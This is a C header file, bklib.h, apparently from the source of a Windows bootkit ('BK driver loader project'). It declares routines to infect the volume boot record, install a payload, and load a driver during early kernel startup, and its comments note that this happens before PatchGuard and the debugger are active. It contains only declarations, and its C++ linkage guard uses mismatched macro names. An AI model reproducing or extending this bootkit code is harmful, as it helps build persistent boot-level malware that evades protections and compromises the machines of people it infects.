//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// BK driver loader project. Version 2.
//	
// module: bklib.h
// description: 
//	BK helper library. Contains BK installation and BK driver initialization routines.


typedef	NTSTATUS (_stdcall* PBK_INSTALL_CALLBACK)	(PVOID pLoaderContext);
typedef NTSTATUS (_stdcall*	PBK_DRIVER_CALLBACK)	(PVOID pDriverObject, PUNICODE_STRING pusRegistryPath);


PVOID	BkNtKernelBase;		//	NT kernel base
PVOID	BkImageBase;		//	Current driver base


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	BK initialization routine. Normally called twice: 
//	 - when BK loads the driver, is this case pDriverObject == 0 and pusRegistryPath is pointer to PBK_LDR_CONTEXT structure.
//	 - when the driver being registered by the OS.
//
NTSTATUS BkInitialize(
				PVOID					pDriverObject,
				PUNICODE_STRING			pusRegistryPath,
				PBK_INSTALL_CALLBACK	pfnInstallRoutine,
				PBK_DRIVER_CALLBACK		pfnDriverRoutine
				);


//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Driver initialization routine.
//	Called from nt!KiSystemStartup. 
//	IDT is not initialized yet. Interrupts are disabled. Only one CPU enabled. No PatchGuard. IRQL = DISPATCH_LEVEL. 
//	Debugger is unaccessable since KD is not initialized too.
//	SSE, SSE2 should be used very carefully, since no SSE state was saved before the call.
//
NTSTATUS	BkInstall(PVOID	LdrContext);


/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Retrieves a module base for the specified module.
PVOID	BkGetModuleBase(
					PCHAR	ModuleName
					);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Retrieves the address of an exported function or variable from the specified module.
PVOID	BkGetFunctionAddress(
						PVOID		ImageBase,			// target module base
						PCHAR		FunctionName		// target function name
						);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//	Installs BK to load the specified driver.
//
#ifdef _cplusplus
	extern "C"
	{
#endif
	ULONG _stdcall	BkInstallVbr(PCHAR TargetPath);
	ULONG _stdcall 	BkSetupWithPayload(PCHAR Payload, ULONG PayloadSize);
#ifdef _cpluplus
	}
#endif

	
	